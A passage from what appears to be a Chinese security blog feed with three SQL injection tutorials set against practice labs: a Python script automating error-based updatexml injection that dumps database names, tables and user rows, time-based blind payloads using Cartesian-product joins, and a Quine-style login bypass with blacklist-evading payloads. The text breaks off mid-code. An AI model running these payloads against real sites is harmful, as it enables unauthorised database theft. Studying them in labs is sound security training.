响应的状态的检测，确保只处理成功的响应</span></span><br><span class="line">            <span class="keyword">return</span> response.text</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 请求失败: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_data</span>(<span class="params">self, html</span>):  <span class="comment"># html，网页HTML的内容</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;从错误信息中提取数据&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> html:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        <span class="keyword">return</span> re.findall(<span class="variable language_">self</span>.pattern, html)  <span class="comment"># self.pattern 返回所有非重叠匹配的列表</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_database_count</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 获取数据库的数量</span></span><br><span class="line">        payload = <span class="string">&quot; or updatexml(0,concat(0x7e,(select count(schema_name) from information_schema.schemata),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)  <span class="comment"># 调用类中的 send_payload 方法发送构造的注入语句，返回服务器响应的HTML的内容</span></span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span>  <span class="comment"># 如果resul存在的话将result数组第一个字符转化为整形，result不存在的话返回0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_databases</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="comment"># 获取所有非系统数据库名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_database_count()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 发现 <span class="subst">&#123;count&#125;</span> 个数据库&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select schema_name from information_schema.schemata limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            db_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> db_names:</span><br><span class="line">                <span class="variable language_">self</span>.databases.extend(db_names)  <span class="comment"># 将提取到底的数据库名添加到self.databases的表中</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 过滤常见系统数据库</span></span><br><span class="line">        system_dbs = [<span class="string">&#x27;information_schema&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;performance_schema&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>]</span><br><span class="line">        <span class="variable language_">self</span>.databases = [db <span class="keyword">for</span> db <span class="keyword">in</span> <span class="variable language_">self</span>.databases <span class="keyword">if</span> db <span class="keyword">not</span> <span class="keyword">in</span> system_dbs]</span><br><span class="line">        <span class="comment"># for db in self.databases，遍历 self.databases 列表中的每一个元素（即数据库名），临时变量 db 表示当前遍历的数据库名，保留满足条件的db名</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 可用数据库列表:&quot;</span>, <span class="variable language_">self</span>.databases)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.databases</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_table_count</span>(<span class="params">self, database</span>):</span><br><span class="line">        <span class="comment"># 获取指定数据库的表的数量</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_tables</span>(<span class="params">self, database</span>):</span><br><span class="line">        <span class="comment"># 获取指定数据库的所有表名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_table_count(database)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据库 <span class="subst">&#123;database&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 个表&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            table_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> table_names:</span><br><span class="line">                <span class="variable language_">self</span>.tables.extend(table_names)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据库 <span class="subst">&#123;database&#125;</span> 的表列表:&quot;</span>, <span class="variable language_">self</span>.tables)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.tables</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_column_count</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的列数量</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27;),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_columns</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的所有列名</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_column_count(table)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 表 <span class="subst">&#123;table&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 个列&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            column_names = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> column_names:</span><br><span class="line">                <span class="variable language_">self</span>.columns.extend(column_names)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 表 <span class="subst">&#123;table&#125;</span> 的列列表:&quot;</span>, <span class="variable language_">self</span>.columns)</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.columns</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data_count</span>(<span class="params">self, table</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的数据的行数</span></span><br><span class="line">        payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select count(*) from `<span class="subst">&#123;table&#125;</span>`),0x7e),1)--+&quot;</span></span><br><span class="line">        html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">        result = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(result[<span class="number">0</span>]) <span class="keyword">if</span> result <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self, table, columns</span>):</span><br><span class="line">        <span class="comment"># 获取指定表的数据</span></span><br><span class="line">        count = <span class="variable language_">self</span>.get_data_count(table)</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!] 表 <span class="subst">&#123;table&#125;</span> 中没有数据或无法访问&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 表 <span class="subst">&#123;table&#125;</span> 有 <span class="subst">&#123;count&#125;</span> 行数据&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(count):</span><br><span class="line">            <span class="comment"># 获取多列数据，用~分隔</span></span><br><span class="line">            cols = <span class="string">&quot;,&quot;</span>.join([<span class="string">f&quot;`<span class="subst">&#123;col&#125;</span>`&quot;</span> <span class="keyword">for</span> col <span class="keyword">in</span> columns])</span><br><span class="line">            payload = <span class="string">f&quot; or updatexml(0,concat(0x7e,(select concat_ws(0x7e,<span class="subst">&#123;cols&#125;</span>) from `<span class="subst">&#123;table&#125;</span>` limit <span class="subst">&#123;i&#125;</span>,1),0x7e),1)--+&quot;</span></span><br><span class="line">            html = <span class="variable language_">self</span>.send_payload(payload)</span><br><span class="line">            row_data = <span class="variable language_">self</span>.extract_data(html)</span><br><span class="line">            <span class="keyword">if</span> row_data:</span><br><span class="line">                <span class="variable language_">self</span>.data.append(row_data[<span class="number">0</span>].split(<span class="string">&#x27;~&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[!] 获取数据失败，可能是权限不足或表结构特殊&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 表 <span class="subst">&#123;table&#125;</span> 的数据:&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> <span class="variable language_">self</span>.data:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot; | &quot;</span>.join(row))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interactive_select</span>(<span class="params">options, prompt</span>):  <span class="comment">#options: 一个列表，包含所有可供选择的选项，prompt: 字符串，显示给用户的提示信息</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;交互式选择菜单&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + prompt)</span><br><span class="line">    <span class="keyword">for</span> i, opt <span class="keyword">in</span> <span class="built_in">enumerate</span>(options, <span class="number">1</span>): <span class="comment">#格式化每个选项，使标号123与选项123对应</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;opt&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            choice = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;请选择(1-&#123;&#125;): &quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(options))))</span><br><span class="line">            <span class="keyword">if</span> <span class="number">1</span> &lt;= choice &lt;= <span class="built_in">len</span>(options):</span><br><span class="line">                <span class="keyword">return</span> options[choice - <span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;输入无效，请重新选择&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;请输入数字&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    explorer = SQLiExplorer()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1. 获取所有数据库</span></span><br><span class="line">    explorer.get_databases()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.databases:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未发现可用数据库&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交互式选择数据库</span></span><br><span class="line">    target_db = interactive_select(explorer.databases, <span class="string">&quot;请选择要查询的数据库:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 获取选定数据库的所有表</span></span><br><span class="line">    explorer.get_tables(target_db)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.tables:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 数据库 <span class="subst">&#123;target_db&#125;</span> 中没有表&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 交互式选择表</span></span><br><span class="line">    target_table = interactive_select(explorer.tables, <span class="string">f&quot;请选择要查询的表(数据库: <span class="subst">&#123;target_db&#125;</span>):&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 获取选定表的所有列</span></span><br><span class="line">    explorer.get_columns(target_table)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> explorer.columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 表 <span class="subst">&#123;target_table&#125;</span> 中没有列&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 选择要查询的列(多选)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, col <span class="keyword">in</span> <span class="built_in">enumerate</span>(explorer.columns, <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>. <span class="subst">&#123;col&#125;</span>&quot;</span>)</span><br><span class="line">    selected = <span class="built_in">input</span>(<span class="string">&quot;选择列: &quot;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">    selected_columns = [explorer.columns[<span class="built_in">int</span>(i) - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> selected <span class="keyword">if</span> i.isdigit()]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> selected_columns:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 未选择有效列，默认查询前两列&quot;</span>)</span><br><span class="line">        selected_columns = explorer.columns[:<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 获取表数据</span></span><br><span class="line">    explorer.get_data(target_table, selected_columns)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">[*] 发现 9 个数据库</span><br><span class="line">[+] 可用数据库列表: [&#x27;cc&#x27;, &#x27;challenges&#x27;, &#x27;cvcv&#x27;, &#x27;security&#x27;, &#x27;sqlii&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的数据库:</span><br><span class="line">1. cc</span><br><span class="line">2. challenges</span><br><span class="line">3. cvcv</span><br><span class="line">4. security</span><br><span class="line">5. sqlii</span><br><span class="line">请选择(1-5): 4</span><br><span class="line">[*] 数据库 security 有 4 个表</span><br><span class="line">[+] 数据库 security 的表列表: [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的表(数据库: security):</span><br><span class="line">1. emails</span><br><span class="line">2. referers</span><br><span class="line">3. uagents</span><br><span class="line">4. users</span><br><span class="line">请选择(1-4): 4</span><br><span class="line">[*] 表 users 有 11 个列</span><br><span class="line">[+] 表 users 的列列表: [&#x27;id&#x27;, &#x27;name&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;type&#x27;, &#x27;USER&#x27;, &#x27;CURRENT_CONNECTIONS&#x27;, &#x27;TOTAL_CONNECTIONS&#x27;, &#x27;id&#x27;, &#x27;username&#x27;, &#x27;password&#x27;]</span><br><span class="line"></span><br><span class="line">请选择要查询的列(可多选，输入逗号分隔的数字如1,2,3):</span><br><span class="line">1. id</span><br><span class="line">2. name</span><br><span class="line">3. username</span><br><span class="line">4. password</span><br><span class="line">5. type</span><br><span class="line">6. USER</span><br><span class="line">7. CURRENT_CONNECTIONS</span><br><span class="line">8. TOTAL_CONNECTIONS</span><br><span class="line">9. id</span><br><span class="line">10. username</span><br><span class="line">11. password</span><br><span class="line">选择列: 3</span><br><span class="line">[*] 表 users 有 13 行数据</span><br><span class="line">[+] 表 users 的数据:</span><br><span class="line">Dumb</span><br><span class="line">Angelina</span><br><span class="line">Dummy</span><br><span class="line">secure</span><br><span class="line">stupid</span><br><span class="line">superman</span><br><span class="line">batman</span><br><span class="line">admin</span><br><span class="line">admin1</span><br><span class="line">admin2</span><br><span class="line">admin3</span><br><span class="line">dhakkan</span><br><span class="line">admin4</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>笛卡尔积-时间盲注</title>
      <link href="/2025/04/24/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
      <url>/2025/04/24/%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="笛卡尔积"><a href="#笛卡尔积" class="headerlink" title="笛卡尔积"></a>笛卡尔积</h3><p>原理：连接表是一个很耗时的操作（A×B&#x3D;A和B中每个元素的组合所组成的集合，就是连接表）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;</span><br></pre></td></tr></table></figure><p><strong>靶场实践</strong>（<code>sqli-9</code>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select database()))&gt;7,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133119.png" alt="image-20250424213321067"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242133309.png" alt="image-20250424213359282"></p><p>页面直接回显，说明书库名的长度为7.</p><p>接下来查询数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr(database(),1,1))&gt;114,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134537.png" alt="image-20250424213424502"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134040.png" alt="image-20250424213441011"></p><p>页面立刻回显</p><p>说明数据库名的第一个字符串对应的<code>ascii</code>码的值为115，则第一个字符串为‘s’。</p><p>以此类推可以得到完整的数据库名为security。</p><p>接下来查询第一个表名的长度</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242134550.png" alt="image-20250424213458517"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135609.png" alt="image-20250424213513579"></p><p>页面立刻出现回显，说明第一个表名的长度为6。</p><p>接下来查询第一个表名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135425.png" alt="image-20250424213532389"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242135042.png" alt="image-20250424213545009"></p><p>页面立刻回显，说明表名的第一个字符对应的<code>ascii</code>码的值为101.</p><p>更改<code>substr()</code>函数的参数可以得到完整的表名。</p><p>依次类推，按照上面的方法可以得到列名以及列的内容，这里写一下具体的查询列的内容的查询语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(length((select username from users limit 0,1))&gt;3,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213602897"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136397.png" alt="image-20250424213616364"></p><p>页面立刻回显</p><p>说明<code>username</code>列的第一个数据的长度是4</p><p>接下来查询这个列中的第一个字符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 &#x27; and if(ascii(substr((select username from users limit 0,1),1,1))&gt;67,(select count(*) from information_schema.columns A,information_schema.columns B,information_schema.columns C),0)--+</span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136590.png" alt="image-20250424213635556"></p><p>页面延迟回显</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202504242136928.png" alt="image-20250424213648892"></p><p>页面立刻回显</p><p>说明<code>username</code>列的第一个数据的第一个字符对应的<code>ascii</code>码的之为68，</p><p>以此类推可以的得到完整的数据。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Quine</title>
      <link href="/2025/04/24/Quine/"/>
      <url>/2025/04/24/Quine/</url>
      
        <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><code>Quine</code>又叫做自产生程序，在<code>sql</code>注入技术中，这是一种是的输入的<code>SQL</code></p><p>语句与输出的<code>SQL</code>语句一致的技术，常用于一些特殊的登陆绕过<code>sql</code>注入中。</p><p>实践</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function checkSql($s) &#123;</span><br><span class="line">    if(preg_match(&quot;/regexp|between|in|flag|=|&gt;|&lt;|and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;,$s))&#123;</span><br><span class="line">        alertMes(&#x27;hacker&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;username&#x27;]) &amp;&amp; $_POST[&#x27;username&#x27;] != &#x27;&#x27; &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; $_POST[&#x27;password&#x27;] != &#x27;&#x27;) &#123;</span><br><span class="line">    $username=$_POST[&#x27;username&#x27;];</span><br><span class="line">    $password=$_POST[&#x27;password&#x27;];</span><br><span class="line">    if ($username !== &#x27;admin&#x27;) &#123;</span><br><span class="line">        alertMes(&#x27;only admin can login&#x27;, &#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    checkSql($password);</span><br><span class="line">    $sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">    $user_result=mysqli_query($con,$sql);</span><br><span class="line">    $row = mysqli_fetch_array($user_result);</span><br><span class="line">    if (!$row) &#123;</span><br><span class="line">        alertMes(&quot;something wrong&quot;,&#x27;index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($row[&#x27;password&#x27;] === $password) &#123;</span><br><span class="line">    die($FLAG);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">    alertMes(&quot;wrong password&quot;,&#x27;index.php&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观察这个源码，存在一个看似很明显的<code>SQL</code>注入，黑名单中还有许多的过滤。</p><p>例如：</p><p>like替换’&#x3D;’,benchmark()替换sleep函数，mid()函数替换<code>substr()</code>函数，&#x2F;**&#x2F;替换空格。</p><p>下面是注入的payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select if((select ascii(mid((select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema like database()),&#123;&#125;,1)) like &#123;&#125;),(select benchmark(4999999,md5(&#x27;test&#x27;))),1)#</span><br></pre></td></tr></table></figure><p>（<code>sys.schema_table_statistics_with_buffer</code>是<code>Mysql</code>数据库中的一个系统视图，提供了数据库中的表哦的统计信息和缓冲池的使用情况）</p><p>这样注入得到的表中并没有密码。</p><p>再观察源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;SELECT password FROM users WHERE username=&#x27;admin&#x27; and password=&#x27;$password&#x27;;&quot;;</span><br><span class="line">$user_result=mysqli_query($con,$sql);</span><br><span class="line">$row = mysqli_fetch_array($user_result);</span><br><span class="line"></span><br><span class="line">if ($row[&#x27;password&#x27;] === $password) 